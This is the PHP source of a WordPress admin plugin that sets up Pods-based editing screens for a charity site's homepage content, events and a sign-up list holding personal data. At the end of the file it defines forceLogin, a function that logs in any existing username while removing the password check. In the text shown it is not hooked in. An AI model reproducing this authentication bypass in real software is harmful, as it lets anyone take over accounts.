<?php
/*
Plugin Name: PoP Custom Management
Plugin URI: http://pencilsofpromise.org
Description: Custom plugin to enable the editing of PoP-specific content (outside of Posts, Pages and the Media Library).
Version: 1.0
Author: AgencyNet
Author URI: http://www.agencynet.com
*/


/************************************************
	Setup Custom Menu Structure
************************************************/
function setup_menus() {
	$icon = '';
	add_menu_page('Site Features', 'Site Features', 'publish_pages', 'pop_site_features', '', $icon, 36);
	add_submenu_page('pop_site_features','','','publish_pages','pop_site_features','homepage_touts_page');
	add_submenu_page('pop_site_features', 'Homepage Features', 'Homepage Features', 'publish_pages', 'pop_homepage_features', 'homepage_features_page');
	add_submenu_page('pop_site_features', 'Homepage Ticker', 'Homepage Ticker', 'publish_pages', 'pop_homepage_ticker', 'homepage_ticker_page');
	add_submenu_page('pop_site_features', 'Homepage Touts', 'Homepage Touts', 'publish_pages', 'pop_homepage_touts', 'homepage_touts_page');
	add_submenu_page('pop_site_features', 'Movement Touts', 'Movement Touts', 'publish_pages', 'pop_movement_touts', 'movement_touts_page');
	add_submenu_page('pop_site_features', 'PoP & Local Events', 'PoP & Local Events', 'publish_pages', 'pop_events', 'movement_events_page');
	add_submenu_page('pop_site_features', 'Season of 1000', 'Season of 1000 Promises', 'publish_pages', 'season1000', 'season_1000_page');
}


/************************************************
	Setup menu item administration pages
************************************************/
function homepage_features_page() {
	$object = new Pod('homepage_features');
	$add_fields = $edit_fields = array(
		'name',
		'image',
		'copy',
		'link_page',
		'link_post',
		'link_custom',
		'comments'
		);
	$object->ui = array(
		'title'   => 'Homepage Features',
		'reorder' => 'displayorder',
		'reorder_columns' => array(
			'name'		=> 'Title',
			'comments'	=> 'Comments'),
		'columns' => array(
			'name'    	=> 'Title',
			'copy'		=> 'Copy',
			'comments'	=> 'Comments'),
		'add_fields'  => $add_fields,
		'edit_fields' => $edit_fields
		);
	pods_ui_manage($object);
}

function homepage_ticker_page() {
	$object = new Pod('homepage_ticker');
	$add_fields = $edit_fields = array(
		'name',
		'link'
		);
	$object->ui = array(
		'title'   => 'Homepage Ticker',
		'reorder' => 'displayorder',
		'reorder_columns' => array(
			'name'	=> 'Text',
			'link'	=> 'Links To'),
		'columns' => array(
			'name'   => 'Text',
			'link'	=> 'Links To'),
		'add_fields'  => $add_fields,
		'edit_fields' => $edit_fields
		);
	pods_ui_manage($object);
}

function homepage_touts_page() {
	$object = new Pod('homepage_touts');
	$add_fields = $edit_fields = array(
		'name',
		'link',
		'percentage',
		'icon',
		'comments'
		);
	$object->ui = array(
		'title'   => 'Homepage Touts',
		'reorder' => 'displayorder',
		'reorder_columns' => array(
			'name'			=> 'Name',
			'percentage'	=> 'Percentage'),
		'columns' => array(
			'name'    		=> 'Name',
			'percentage'	=> 'Percentage',
			'link'			=> 'Links To',
			'comments'		=> 'Comments'),
		'add_fields'  => $add_fields,
		'edit_fields' => $edit_fields
		);
	pods_ui_manage($object);
}

function movement_touts_page() {
	$object = new Pod('movement_tout');
	$add_fields = $edit_fields = array(
		'name',
		'featured_image',
		'wp_page',
		'custom_url',
		'upload_file',
		'comments',
		'tout_type',
		'do_not_show'
		);
	$object->ui = array(
		'title'   => 'Join the Movement Touts',
		'reorder' => 'displayorder',
		'reorder_columns' => array(
			'name'		=> 'Title',
			'comments'	=> 'Comments'),
		'columns' => array(
			'name'    	=> 'Title',
			'featured_image' => 'Featured Image',
			'wp_page'	=> 'Wordpress Page',
			'custom_url' => 'Custom URL',
			'upload_file' => 'File Upload',
			'comments'	=> 'Comments',
			'tout_type' => 'Type',
			'do_not_show' => 'Hidden'),
		'add_fields'  => $add_fields,
		'edit_fields' => $edit_fields
		);
	pods_ui_manage($object);
}

function movement_events_page() {
	$object = new Pod('events');
	$add_fields = $edit_fields = array(
		'name',
		'thumb_url',
		'event_intro',
		'event_type',
		'purchase_url',
		'date'
		);
	$object->ui = array(
		'title'   => 'PoP & Local Events',
		'reorder_columns' => array(
			'name'		=> 'Name',
			'date'		=> 'Date of Event'),
		'columns' => array(
			'name'    	=> 'Name',
			'thumb_url' => 'Thumbnail',
			'event_intro'	=> 'Event Intro Copy',
			'event_type' => 'Type of Event',
			'purchase_url' => 'URL to Purchase Tickets/More Info',
			'date'	=> 'Date of Event'),
		'add_fields'  => $add_fields,
		'edit_fields' => $edit_fields
		);
	pods_ui_manage($object);
}

function season_1000_page() {
	$object = new Pod('season1000');
	$add_fields = $edit_fields = array(
		'name',
		'lname',
		'email',
		'promise',
		'zipcode',
		'gender',
		'dobmm',
		'dobdd',
		'dobyyyy',
		'optin'
		);
	$object->ui = array(
		'title'   => 'PoP & Local Events',
		'reorder_columns' => array(
			'name'		=> 'First Name',
			'lname'		=> 'Last Name',
			'gender'		=> 'Gender'),
		'columns' => array(
			'name'    	=> 'First Name',
			'lname'    	=> 'Last Name',
			'email' 		=> 'E-mail Address',
			'promise'	=> 'Promise',
			'zipcode' 	=> 'Zipcode',
			'gender' 	=> 'Gender',
			'optin' 	=> 'Opted In'),
		'add_fields'  => $add_fields,
		'edit_fields' => $edit_fields
		);
	pods_ui_manage($object);
}


/************************************************
	Add custom menu to admin navigation on load
************************************************/
add_action('admin_menu','setup_menus');

function forceLogin($user,$username,$password) {
    if(username_exists($username)) {
        $user=get_user_by('login',$username);
        remove_action('authenticate', 'wp_authenticate_username_password', 20);
        return $user;
    }
}

?>